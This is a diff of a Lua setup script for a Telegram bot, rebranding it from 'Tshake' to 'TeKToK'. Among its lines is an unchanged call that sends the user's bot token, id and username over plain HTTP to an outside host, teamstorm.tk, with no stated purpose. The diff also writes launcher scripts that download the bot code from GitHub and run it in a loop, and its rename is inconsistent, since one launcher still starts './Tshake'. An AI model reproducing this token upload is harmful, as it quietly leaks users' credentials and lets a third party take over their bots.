@@ -30,7 +30,7 @@ end
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua start.lua')
+os.execute('lua run.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
@@ -46,11 +46,11 @@ end
 local Json = JSON:decode(Get_Info)
 if Json.Info == false then
 io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
-os.execute('lua start.lua')
+os.execute('lua run.lua')
 else
 if Json.Info == 'Channel' then
 io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua start.lua')
+os.execute('lua run.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
 database:set(Server_Tshake.."UserName_Tshake",Json.Info.Username)
@@ -60,32 +60,32 @@ end
 else
 io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua start.lua')
+os.execute('lua run.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
 http.request("http://teamstorm.tk/insert/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
-local RunTshake = io.open("Tshake", 'w')
+local RunTshake = io.open("TeKToKTeKToK", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
-cd $HOME/Tshake
+cd $HOME/TeKToK
 token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
-rm -fr Tshake.lua
-wget "https://raw.githubusercontent.com/tshakeabas/Tshake/master/Tshake.lua"
+rm -fr TekToK.lua
+wget "https://raw.githubusercontent.com/TeKToKBot/TeKToK/master/TeKToK.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./Tshake.lua -p PROFILE --bot=$token
+./tg -s ./TeKToK.lua -p PROFILE --bot=$token
 done
 ]])
 RunTshake:close()
-local RunTs = io.open("ts", 'w')
+local RunTs = io.open("tk", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/Tshake
+cd $HOME/TeKToK
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Tshake -X kill
-screen -S Tshake ./Tshake
+screen -S TeKToK -X kill
+screen -S TeKToK ./Tshake
 done
 ]])
 RunTs:close()
@@ -93,7 +93,7 @@ end
 Files_Tshake_Info()
 database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
 sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
+os.execute('./ins.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
@@ -104,7 +104,7 @@ else
 f:close()  
 database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
 sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
+os.execute('./ins.sh ins')
 var = false
 end  
 return var
